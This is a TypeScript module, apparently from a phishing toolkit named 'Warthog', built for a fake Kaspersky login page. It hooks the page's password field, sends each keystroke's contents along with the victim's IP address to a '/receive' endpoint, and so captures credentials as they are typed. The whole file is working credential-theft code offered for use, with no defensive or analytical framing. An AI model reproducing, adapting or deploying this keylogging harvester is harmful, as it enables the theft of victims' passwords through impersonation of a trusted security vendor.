import { Warthog } from './../warthog';
import { ModuleInterface } from './../interfaces/module';

/**
 * Exploit kaspersky phishing page
 * 
 * @export
 * @class Kaspersky
 * @implements {ModuleInterface}
 */
export class Kaspersky implements ModuleInterface {
	numberChar: number;
	url: string;
	element: any;
	parent: Warthog;

	/**
	 * Creates an instance of Kaspersky.
	 * 
	 * @param {Warthog} parent
	 * @memberOf Kaspersky
	 */
	constructor(parent: Warthog) {
		this.numberChar = 0;
		this.element = null;
		this.url = "/receive";
		this.parent = parent;
	}

	/**
	 * Required function
	 * @memberOf Kaspersky
	 */
	init(): void {
		this.element = document.getElementById("passwd");
		this.eventListener();
	}

	/**
	 * Setup event listener
	 * @memberOf Kaspersky
	 */
	eventListener(): void {
		var self: Kaspersky = this;

		this.element.onkeyup = function(evt) {
			self.execute(this.value);	
		}
	}

	/**
	 * Execute payload
	 * 
	 * @param {string} val
	 * @memberOf Kaspersky
	 */
	execute(val: string): void {
		var len: number = val.length;

		if (len > this.numberChar) {
			var query: string[] = [];
			var xhr: XMLHttpRequest = this.parent.ajax("POST", this.url, null);

			query.push("pass=" + encodeURI(val));
			query.push("nb_char=" + this.numberChar);

			this.parent.getIP(function(ip) {
				query.push("ip", JSON.stringify(ip));
				xhr.send(query.join('&'));
			});

			this.numberChar++;
		} else {
			this.numberChar--;
		}

		if (len == 0) {
			this.numberChar = 0;
		}
	}
}
